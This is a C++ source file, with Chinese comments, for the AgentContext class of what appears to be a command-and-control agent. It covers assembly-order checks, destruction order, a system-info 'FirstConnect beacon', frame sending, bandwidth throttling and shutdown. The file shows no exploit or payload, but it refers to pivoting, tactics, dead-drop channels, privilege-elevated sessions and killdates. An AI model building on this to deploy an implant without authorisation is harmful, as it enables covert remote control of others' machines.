/**

 * @file AgentContext.cpp

 * @brief 身份重构⑤: AgentContext 主体 —— 生命周期/运行态/发帧。

 * @details

 * 类不变, 实现分布三 TU(本文件 + AgentContextAssemble.cpp 装配 +

 * AgentContextRuntime.cpp 运行期动作)。共享 helper 在 AgentContextInternals.h。

 */

#include "Core/Comms/Internal/ChannelRateLimiter.hpp"

#include "Components/Commands/SystemInfo/Provider/SystemInfoProvider.hpp"

#include "AgentContext.hpp"

#include "Core/Comms/CommsManager.hpp"
#include "Core/Comms/Platform/INetworkOps.hpp"
// ~AgentContext 在此 TU 定义: unique_ptr<IHttpOps>(dead_drop_http_) 析构需完整类型
#include "Core/Comms/Platform/IHttpOps.hpp"

#include "Core/Comms/OutboundSink.hpp"

#include "Core/Comms/OutboundMessages.hpp"

#include "Core/Comms/Session/SessionLoop.hpp"

#include "Core/Command/Queue/CommandWorker.hpp"

#include "Core/Command/Intake/CommandProcessor.hpp"

#include "Core/Command/Dispatch/CommandDispatcher.hpp"

#include "Core/Identity/SessionIdentity.hpp"

#include "Core/Config/AgentConfig.hpp"

#include "Common/Logger/Logger.hpp"

#include "Common/Protocol/FrameBuilder.hpp"

#include "Common/Protocol/Packet.hpp"

#include "Common/Version.hpp"


#include "Common/ThirdParty/json.hpp"


#include "Core/Job/JobRuntime.hpp"

#include "Core/Module/ModuleManager.hpp"

#include "Components/Tactics/Framework/TacticManager.hpp"

#include "Components/Pivot/PivotManager.hpp"

#include "Components/Pivot/PipeSessionHub.hpp"

#include "Core/Concurrency/ThreadGovernor.hpp"



#include <algorithm>
#include <stdexcept>



namespace cleat {



    AgentContext::AgentContext() {

        Initialize();

    }



    AgentContext::~AgentContext() {

        Shutdown();

        // 装配根治理第 4 步: **显式析构序**, 摆脱"成员声明位置"的隐式依赖。
        //
        // 此前两条顺序约束只写在注释里, 靠"声明在前 = 后析构"这条反直觉规则维持:
        //   (C8)   ~SessionLoop 会调 network_.Disconnect() → network_ 须比 session_loop_ 晚析构;
        //   (DD)   DeadDropManager 以引用持 dead_drop_http_ → dead_drop_http_ 须比 dead_drop_ 晚析构。
        // 这在  已被写反过一次(UAF),  才修正 —— 属"注释当真相",
        // 谁挪动一下声明位置就静默复发。
        //
        // 现在: 在析构体里**按显式顺序 reset()** 有约束的成员 —— 依赖方先销毁, 被依赖方
        // 后销毁。reset() 后成员为空, 紧随其后的自动析构(按声明逆序)对其为空操作, 于是
        // **声明位置不再承载语义**。顺序写在代码里, 不写在注释里。
        session_loop_.reset();      // 依赖 network_ → 先销毁
        dead_drop_.reset();         // 依赖 dead_drop_http_ → 先销毁
        network_.reset();           // 被 session_loop_ 依赖 → 后销毁
        dead_drop_http_.reset();    // 被 dead_drop_ 依赖 → 后销毁

    }



    // ========================================================================

    // 初始化（顶层调度入口）

    // ========================================================================



    void AgentContext::Initialize() {

        // 信封注入接线(必须在任何出站帧之前): `session_id` 由 FrameBuilder 在 Build 时

        // 统一写入顶层, 取代此前 10 处手工塞(位置还分裂为顶层/data/params 三种)。

        // 根因见 FrameBuilder::SetSessionIdProvider 注释 —— 服务/模块的回调透传链路

        // 没有任何一层负责信封, 流数据帧因此不带 session_id, 被服务端按"非注册首帧"

        // 匿名注册(一帧一会话)。

        FrameBuilder::SetSessionIdProvider([] {

            return SessionIdentity::Instance().GetSessionId();

            });

        // 6 步装配 —— **单张顺序表**(装配根治理第 3 步, )。
        // 顺序只在下面这一处声明; 每一步"做什么"在 RunAssembleStep 的分派里。
        // 执行前统一先跑前置断言(RequireStepPrecondition), 末尾整体自洽校验
        // (VerifyAssembled)。**这就是"顺序契约"的可执行形式** —— 见 AgentContext.hpp
        // 的 AssembleStep 注释。任何一步被跳过/挪位, 在**该步**立即报错并带步骤名,
        // 而不是几层之后一个空指针解引用。
        static const AssembleStep kSteps[] = {

            AssembleStep::CommsLayer,

            AssembleStep::Handlers,

            AssembleStep::Callbacks,

            AssembleStep::Infrastructure,

            AssembleStep::EventReporter,

            AssembleStep::CommandWorker,

        };

        for (const AssembleStep step : kSteps) {

            RequireStepPrecondition(step);

            RunAssembleStep(step);

        }

        VerifyAssembled();

    }

    void AgentContext::RunAssembleStep(AssembleStep step) {

        // 装配步骤的**唯一分派点**。刻意不加 default: /W4 下新增 AssembleStep
        // 枚举值会触发 C4062(switch 未处理所有枚举值)告警, 强制补上对应 case。

        switch (step) {

        case AssembleStep::CommsLayer:
            SetupCommsLayer();
            return;

        case AssembleStep::Handlers:
            RegisterAllHandlers();
            return;

        case AssembleStep::Callbacks:
            SetupCallbacks();
            return;

        case AssembleStep::Infrastructure:
            SetupInfrastructure();
            return;

        case AssembleStep::EventReporter:
            event_reporter_.Install();   // 诊断重构 ①
            return;

        case AssembleStep::CommandWorker:
            StartCommandWorker();
            return;

        }

    }

    // ========================================================================

    // 装配就绪断言: 把"6 步隐式顺序"变成"可执行契约"。

    // 检查的是**产物对象**(从事实推导), 不是手工 flag —— 产物不会撒谎。

    // ========================================================================

    void AgentContext::RequireStepPrecondition(AssembleStep step) const {

        const char* name = "?";

        const char* missing = nullptr;

        switch (step) {

        case AssembleStep::CommsLayer:

            // 第一步是装配的根: 它从零建图, 无前置。唯一的前置是"不重复初始化"

            // (重复调用会静默重建图并在旧回调里留下悬垂 this)。

            name = "SetupCommsLayer";

            if (chain_) missing = "chain_(已初始化? Initialize 被重复调用?)";

            break;

        case AssembleStep::Handlers:

            name = "RegisterAllHandlers";

            if (!dispatcher_) missing = "dispatcher_(须由 SetupCommsLayer 建)";

            break;

        case AssembleStep::Callbacks:

            name = "SetupCallbacks";

            if (!session_loop_) missing = "session_loop_(须由 SetupCommsLayer 建)";

            else if (!sink_) missing = "sink_(须由 SetupCommsLayer 建)";

            else if (!chain_) missing = "chain_(须由 SetupCommsLayer 建)";

            break;

        case AssembleStep::Infrastructure:

            name = "SetupInfrastructure";

            if (!network_) missing = "network_(须由 SetupCommsLayer 建)";

            else if (!chain_) missing = "chain_(须由 SetupCommsLayer 建)";

            else if (!session_loop_) missing = "session_loop_(须由 SetupCommsLayer 建)";

            else if (!processor_) missing = "processor_(须由 SetupCommsLayer 建)";

            break;

        case AssembleStep::EventReporter:

            name = "event_reporter_.Install";

            // Install 只挂 Logger sink; 其出站回调须已在 SetupCommsLayer 绑定,

            // 否则上报帧在 Drain 时无出口(senderSet_ 为 false → 整批丢弃)。

            if (!event_reporter_.IsSenderSet()) {

                missing = "event_reporter_ 出站回调(须由 SetupCommsLayer 绑定)";

            }

            break;

        case AssembleStep::CommandWorker:

            name = "StartCommandWorker";

            // worker 消费 CommandQueue, 与网络图无对象依赖; 但命令处理器须已注册,

            // 否则 worker 拉起的任务找不到 dispatcher。

            if (!dispatcher_) missing = "dispatcher_(须由 SetupCommsLayer 建)";

            break;

        }

        if (missing) {

            const std::string msg = std::string("装配顺序错误: 执行 ") + name

                + " 前缺少前置 " + missing;

            LOG_ERROR("AgentContext: " << msg);

            throw std::logic_error(msg);

        }

    }

    void AgentContext::VerifyAssembled() const {

        // 关键产物清单(与 AssembleStep 一一对应)。任一缺失 = 某步被跳过或顺序被打乱;

        // 立即报错而非留到运行时 —— 运行时才炸会离病灶很远(可能是一次连接、一次析构)。

        struct Item { const char* name; bool ok; };

        const Item items[] = {

            { "chain_(步1)",         chain_ != nullptr },

            { "network_(步1)",       network_ != nullptr },

            { "sink_(步1)",          sink_ != nullptr },

            { "processor_(步1)",     processor_ != nullptr },

            { "session_loop_(步1)",  session_loop_ != nullptr },

            { "dispatcher_(步1)",    dispatcher_ != nullptr },

            { "sys_provider_(步2)",  sys_provider_ != nullptr },

            { "event_reporter_ 已 Install(步5)", event_reporter_.IsInstalled() },

            { "CommandWorker 已启动(步6)", CommandWorker::Instance().IsRunning() },

        };

        std::string bad;

        for (const Item& it : items) {

            if (!it.ok) {

                if (!bad.empty()) bad += ", ";

                bad += it.name;

            }

        }

        if (!bad.empty()) {

            const std::string msg = "装配未完成: 缺失 " + bad;

            LOG_ERROR("AgentContext: " << msg);

            throw std::logic_error(msg);

        }

        LOG_INFO("AgentContext: 装配自洽校验通过 (6 步齐备)");

    }

    SystemInfoProvider& AgentContext::SysProvider() const {

        if (!sys_provider_) {

            // 两类成因, 都必须在**此处**明确失败(而非崩在调用点):
            //   ① 装配未完成(RegisterAllHandlers 未跑);
            //   ② Shutdown 已清空 modules_ —— 此时 sys_provider_ 被同步置空, 防止
            //      悬垂访问(装配根治理第 2 步: 把潜在 UAF 变成确定性、可定位的失败)。
            const std::string msg =
                "sys_provider_ 不可用(装配未完成或已 Shutdown): 非拥有指针已失效";

            LOG_ERROR("AgentContext: " << msg);

            throw std::logic_error(msg);

        }

        return *sys_provider_;

    }

    void AgentContext::RegisterTeardown(std::function<void()> hook) {

        if (hook) teardown_hooks_.push_back(std::move(hook));

    }

    void AgentContext::RunTeardownHooks() {

        // swap 取出后执行: 使 Shutdown 可重入(重复调用第二遍为空循环), 且执行期间
        // 若有钩子触发新登记不会与本轮混淆。
        std::vector<std::function<void()>> hooks;

        hooks.swap(teardown_hooks_);

        // 逆序: 与注册(装配)顺序相反 —— 后装配的先拆, 与成员析构的逆序约定一致。
        for (auto it = hooks.rbegin(); it != hooks.rend(); ++it) {

            (*it)();

        }

        if (!hooks.empty()) {

            LOG_INFO("AgentContext: 收尾钩子已执行 count=" << hooks.size()

                << "(跨单例裸 this 回调已全部置空)");

        }

    }



    // ========================================================================

    // SendFirstConnect: 首次连接 / 重连后的身份上报

    // ========================================================================



    void AgentContext::SendFirstConnect() {

        LOG_INFO("Sending FirstConnect beacon");

        // 非拥有访问收口(装配根治理第 2 步): 经 SysProvider() 取引用并判空,
        // 取代裸 `sys_provider_->` —— 见 AgentContext.hpp 的 SysProvider 注释。
        SystemInfoProvider& sys = SysProvider();

        auto info = sys.GetSystemInfo();

        // 身份重构④: machine_id 由 Core/Identity/MachineIdentity 生成

        // (生存层), SystemInfo 业务信息不再携带身份字段。

        SessionIdentity::Instance().SetMachineId(machine_identity_->Compute());



        nlohmann::json params = sys.ToJson();

        // build_id(注入与迁移设计): 会话接管三元校验之一 —— 编译期构建标识。
        // 统一取自 ver::BuildId(): 该宏逐编译单元展开, 各 TU 直接引用会在同一
        // 构建内差数秒; 收敛到一处求值后, AgentDescribe 自述回的是同一个值。
        params["build_id"] = ver::BuildId();

        // machine_id 注入(身份重构④断链修复, ): 重构④把 machine_id 从
        // SystemInfo ToJson 移除后, 此处只 Set 进 SessionIdentity 单例、从未写入
        // 注册帧 params → 服务端 registerNew 收到空 machine_id, 每次启动都走
        // registerBrandNew 铸新会话(会话 ID 只涨不复用的根因)。**换身份来源时,
        // 必须同步检查本文件的注入点与 ISystemInfo 的移除注释, 三处一体。**
        params["machine_id"] = SessionIdentity::Instance().GetMachineId();

        if (SessionIdentity::Instance().GetOldSessionId() > 0) {
            params["elevated_of"] = SessionIdentity::Instance().GetOldSessionId();
        }

        // 组包收口(M1): 帧 shape 与 SendOptions 声明收口到 msg::FirstConnect;
        // 信封(ts/session_id 顶层)在 msg::Send 内由 FrameBuilder 注入。
        msg::Send(*sink_, msg::FirstConnect(std::move(params)));
    }



    bool AgentContext::SendData(const std::vector<uint8_t>& data) {

        if (!network_) return false;

        try {

            auto it = std::find(data.begin(), data.end(), 0);

            const std::string head(data.begin(), it);

            nlohmann::json j = nlohmann::json::parse(head);



            // 响应帧用 origin_cmd（CommandProcessor 打的响应归属标记，避免与服务器

            // "主动消息 cmd"语义冲突）；主动推送仍用 cmd。

            //  模块数据也是**命令承载类**帧, 故如实声明 cmd(A.2.1) —— 限流决策与

            // 错误回执都归 OutboundSink 与统一观察者, 这里不再自带一份限流器(N3)。

            std::string cmd = j.value("origin_cmd", std::string());

            if (cmd.empty()) {

                cmd = j.value("cmd", std::string());

            }



            //  修复: 此前这里**手抄了一遍 FrameBuilder::Build**(手工塞 ts +

            // 拼 '\0' + 二进制体), 于是绕过信封统一注入 —— `session_id` 从未落到

            // DesktopStreamData 等流数据帧上, 服务端读到 sid=0 → 按"非注册首帧"匿名

            // 注册, 一帧一个新会话(#77→#90)。这正是"一个出口但大家各自造帧"病灶的

            // 位置: 病灶不在 257 个业务构造点, 而在**出口自身**又造了一遍帧。

            // 改走 FrameBuilder 后: 信封(ts/session_id)只有一处来源, 混合帧拼装也只有一处。

            std::vector<uint8_t> out;

            if (it != data.end()) {

                // 混合帧(JSON 头 + '\0' + 二进制体): 走带 body 的重载。

                // header 里已有 body_size(Provider 经 FrameBuilder 构造时写入, 恒为

                // 实际体长), 此处重算结果同值 —— 落线内容逐字节一致。

                const std::vector<uint8_t> body(it + 1, data.end());

                out = FrameBuilder::Build(j, body);

            }

            else {

                out = FrameBuilder::Build(j);

            }

            SendOptions opt;

            opt.kind = SendKind::Module;        // 模块上报(命令承载类, 必须声明 cmd)

            opt.cmd = cmd;

            return Consumed(sink_->Send(out, opt));

        }

        catch (...) {

            // 非 JSON 帧(模块二进制直投): 无法归属命令身份 → 如实不声明, 由 A.2.4 留痕

            SendOptions opt;

            opt.kind = SendKind::Module;

            return Consumed(sink_->Send(data, opt));

        }

    }



    bool AgentContext::Consumed(SendResult r) {

        // 的五值 → "本帧是否已被消费": 已入队(Sent/Queued)或已丢弃(Dropped)都算

        // 消费完毕; Rejected/ChannelFailure 表示本帧未投出(已安全留在出站队列里),

        // 调用方据此留痕即可 —— 与旧 CommsManager::Send 的映射逐条一致。

        return r == SendResult::Sent || r == SendResult::Queued || r == SendResult::Dropped;

    }



    void AgentContext::SendLimitReceipt(const std::string& cmd,

        ChannelRateLimiter::Decision decision, const std::vector<uint8_t>& frame) {

        nlohmann::json err = Packet::Error(ChannelRateLimiter::ReasonOf(decision));

        err["code"] = ChannelRateLimiter::CodeOf(decision);

        try {

            const auto it = std::find(frame.begin(), frame.end(), 0);

            const std::string head(frame.begin(), it);

            const nlohmann::json j = nlohmann::json::parse(head);

            if (j.contains("request_id")) err["request_id"] = j["request_id"];

            if (j.contains("session_id")) err["session_id"] = j["session_id"];

        }

        catch (...) {

            // 原帧不可解析(或为二进制直投): 回执只带 code/message, 不强行关联

        }

        LOG_WARN("AgentContext: 低带宽限流拦截 cmd='" << cmd << "' 原因="

            << ChannelRateLimiter::ReasonOf(decision) << " → 已回错误帧");

        sink_->SendLimitReceipt(FrameBuilder::Build(err));

    }



    int AgentContext::Run(const std::string& host, uint16_t port) {

        // (): 低带宽护栏改为**订阅**带宽档变化(取代"每轮轮询回调")。

        // 语义差别与等价性: 旧形态每轮都调用(幂等, 但无法表达"刚进入降级");

        // 订阅式只在 High->Low 的那一次触发, 且服务/任务的启动门本就在

        // Start 时拒绝低带宽通道上的高带宽服务(故不存在"降级期间新启动又漏停"的缺口)。

        if (chain_) {

            chain_->SetBandwidthObserver([](BandwidthClass from, BandwidthClass to) {

                if (to == BandwidthClass::Low) {

                    LOG_WARN("AgentContext: 带宽档进入 Low —— 停止高带宽任务与服务");

                    // 任务系统 Phase 2: 任务侧走 JobCenter(异步协作式取消)
                    JobRuntime::CancelHighBandwidthOfKind(JobKind::Task);

                    JobRuntime::StopStreamServices();

                }

                else {

                    LOG_INFO("AgentContext: 带宽档恢复 High(from=" << ToString(from)

                        << ") —— 不自动重启已停服务(由操作员显式启动)");

                }

                });

        }

        const SessionLoop::ExitKind kind = session_loop_->Run(host, port);

        // 逻辑)无法从退出码区分终止形态。映射为进程退出码(与 RunAgent 的 1=未捕获
        // 异常 / 3=加密不可用 同序): 0=外部停止或退出请求(正常); 4=生命周期到点
        // (killdate / 窗外退出策略, 计划内终止) —— 守护脚本据此判断"勿再重启"。
        // 本函数无异常退出路径(异常由 RunAgent catch 归 1), 故此处只映射计划内类别。
        return (kind == SessionLoop::ExitKind::Lifecycle) ? 4 : 0;

    }



    void AgentContext::Stop() {

        // 标志能让它们的 Checkpoint 立即返回; 否则下面链路里的 join 全部挂死。
        ThreadGovernor::SetStopping();

        running_.store(false);

        if (session_loop_) {

            session_loop_->Stop();

        }

    }



    void AgentContext::Shutdown() {

        running_.store(false);

        // 停在暂停粗睡里的线程收不到信号 -> 服务 StopAll 的 join 挂死。
        ThreadGovernor::RequestExit();

        //  **先断链再收停** —— 各单例/JobCenter 的出站与检查
        // 线程在本对象析构后调用即 UAF。全部置空后, 在飞调用被各单例既有的判空
        // 路径接住(告警 + 丢弃), UAF 变成可观测降级。置空动作本身单线程(收尾路径)。
        //
        // 装配根治理第 5 步: 置空动作**不再手写于此** —— 改为执行
        // Setup* 期间登记的收尾钩子(RunTeardownHooks)。此前这张手写表已漏掉
        // PivotManager::SetLowBandwidthCheck 与 ModuleManager::SetRuntimeQueries;
        // 现在注册与注销配对出现在装配处, "加新回调"天然带上注销, 不会再漏。
        // 时机不变: 仍在 CommandWorker/session_loop 收停之前(先断链)。
        RunTeardownHooks();

        CommandWorker::Instance().Stop();



        if (session_loop_) {

            session_loop_->Stop();

        }



        modules_.ShutdownAll();

        // 装配根治理第 2 步: ShutdownAll 已清空 modules_ —— sys_provider_
        // 指向其中 SystemInfoModule 的值成员, 此刻已成悬垂。**同步置空**, 使 Shutdown
        // 后的任何误用由 SysProvider() 明确拦下(而非 UAF)。与上面各单例回调置空同一条
        // "非拥有/裸 this 引用在收尾时集中失效"的规约。
        sys_provider_ = nullptr;

    }



} // namespace cleat

